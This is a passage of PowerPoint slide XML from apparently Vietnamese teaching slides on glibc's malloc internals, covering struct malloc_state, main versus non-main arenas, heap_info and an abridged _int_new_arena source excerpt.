              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> hay "chunk" — đó không phải khái niệm của OS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="1417320"/>
            <a:ext cx="5522976" cy="3749040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1951"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="1581912"/>
            <a:ext cx="5157216"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GLIBC — USER-SPACE, KHÔNG ĐẶC QUYỀN KERNEL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="1874520"/>
            <a:ext cx="5157216" cy="9144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Arena là lớp quản lý NẰM TRÊN vùng đó</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="2834640"/>
            <a:ext cx="5157216" cy="2221992"/>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latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>struct malloc_state</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> (mục 2.1) tổ chức vùng OS vừa cấp thành chunk/bin</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>main_arena dùng vùng từ </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>brk()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>; non-main arena dùng vùng từ </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>mmap()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> — cả hai do glibc tự quản lý, không phải OS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="5349240"/>
            <a:ext cx="11274552" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5513832"/>
            <a:ext cx="10908792" cy="640080"/>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Giữ ranh giới này rõ trước khi vào chi tiết: mục 2.1–2.7 nói về cấu trúc </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>malloc_state</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> cụ thể mà glibc dùng để quản lý arena.</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struct malloc_state: sổ sách của một arena</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2.1 · malloc.c:1674–1715</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="5760720" cy="4800600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1524"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1554480"/>
            <a:ext cx="5394960" cy="457200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struct malloc_state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__libc_lock_define (, mutex);</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int flags;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int have_fastchunks;</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  mfastbinptr fastbinsY[NFASTBINS];  /* fastbin (3.3) */</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  mchunkptr top;             /* top chunk, mục 3.1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mchunkptr last_remainder;</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  mchunkptr bins[NBINS * 2 - 2];    /* small+large(3.3)*/</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unsigned int binmap[BINMAPSIZE];</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  struct malloc_state *next;  /* DS liên kết CÁC ARENA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struct malloc_state *next_free;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INTERNAL_SIZE_T attached_threads;</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INTERNAL_SIZE_T system_mem, max_system_mem;</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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6446520" y="1417320"/>
            <a:ext cx="5285232" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3478"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6629400" y="1581912"/>
            <a:ext cx="4919472" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>KHÔNG CÓ TRƯỜNG NÀO TÊN "TCACHE"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6629400" y="1874520"/>
            <a:ext cx="4919472" cy="1536192"/>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Tcache (mục 4) là lớp phía trước arena, nằm trong TLS của từng thread — không thuộc malloc_state.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6446520" y="3703320"/>
            <a:ext cx="5285232" cy="2514600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2909"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6629400" y="3867912"/>
            <a:ext cx="4919472"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MỌI BIN (TRỪ TCACHE) NẰM TRONG STRUCT NÀY</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6629400" y="4160520"/>
            <a:ext cx="4919472" cy="1947672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>fastbinsY[], bins[] (small+large), top đều được nhân bản theo từng arena — không dùng chung toàn process như tcache.</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main_arena vs non-main arena</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2.2 · 2.3 · 2.6 · malloc.c:1761–1766 · arena.c:53–64, 685</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="5522976" cy="1920240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3810"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1527048"/>
            <a:ext cx="5157216" cy="22860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main_arena: biến static trong .data/.bss libc</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1828800"/>
            <a:ext cx="5157216" cy="141732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static struct malloc_state main_arena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b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  .mutex = _LIBC_LOCK_INITIALIZER,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  .next = &amp;main_arena,    /* khép vòng DS liên kết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.attached_threads = 1</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sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="1417320"/>
            <a:ext cx="5522976" cy="1920240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3810"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="1527048"/>
            <a:ext cx="5157216" cy="22860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heap_info: header đứng trước malloc_state của non-main arena</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="1828800"/>
            <a:ext cx="5157216" cy="141732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typedef struct _heap_info</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b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  mstate ar_ptr;          /* arena sở hữu heap này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struct _heap_info *prev; /* sub-heap trước (nếu có)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size_t size;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size_t mprotect_size;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heap_info;</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3429000"/>
          <a:ext cx="11274552" cy="914400"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="2651760"/>
                <a:gridCol w="3959352"/>
                <a:gridCol w="4663440"/>
              </a:tblGrid>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Đặc điểm</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main_arena</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non-main arena</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r>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>malloc_state nằm ở đâu</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static trong .data/.bss libc</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trong mmap, ngay sau heap_info (h + 1)</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00" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Vùng heap lấy từ đâu</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brk()/sbrk() — liền mạch</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mmap(), căn HEAP_MAX_SIZE — thường ở xa</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00" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Mở rộng khi hết chỗ</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gọi MORECORE/sbrk lần nữa</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grow_heap() rồi new_heap() nếu không đủ</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00" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Bit A trên chunk</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luôn 0</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luôn 1</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00" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Số lượng</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đúng 1, suốt tiến trình</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0..mp_.arena_max</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00" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Sinh ra khi nào</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có sẵn từ lúc nạp libc</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chỉ khi một thread gặp tranh chấp khoá</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bl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>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_int_new_arena(): non-main arena sinh ra khi nào</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2.3 · arena.c:685–749, rút gọn</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="6309360" cy="4800600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1524"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1554480"/>
            <a:ext cx="5943600" cy="4572000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>static mstate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_int_new_arena (size_t size)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mstate a; heap_info *h; ...</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  h = new_heap (size + (sizeof (*h) + sizeof (*a)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>                + MALLOC_ALIGNMENT), mp_.top_pad);</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chemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  a = h-&gt;ar_ptr = (mstate) (h + 1);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>             /* malloc_state nằm NGAY SAU heap_info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malloc_init_state (a);</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a-&gt;attached_threads = 1;</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a-&gt;system_mem = a-&gt;max_system_mem = h-&gt;size;</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chemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  top (a) = (mchunkptr) ptr;  /* top chunk arena mới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mstate replaced_arena = thread_arena;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  thread_arena = a;        /* gán arena mới cho THREAD này */</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chemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  a-&gt;next = main_arena.next;  /* chèn vào đầu DS liên kết */</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  main_arena.next = a;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6995160" y="1417320"/>
            <a:ext cx="4736592" cy="1554480"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4706"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="1581912"/>
            <a:ext cx="437083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GỌI KHI NÀO</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="1874520"/>
            <a:ext cx="4370832" cy="98755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arena_get không lấy được arena nào đang rảnh — mọi arena hiện có đều bị thread khác khoá</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6995160" y="3108960"/>
            <a:ext cx="4736592" cy="1463040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
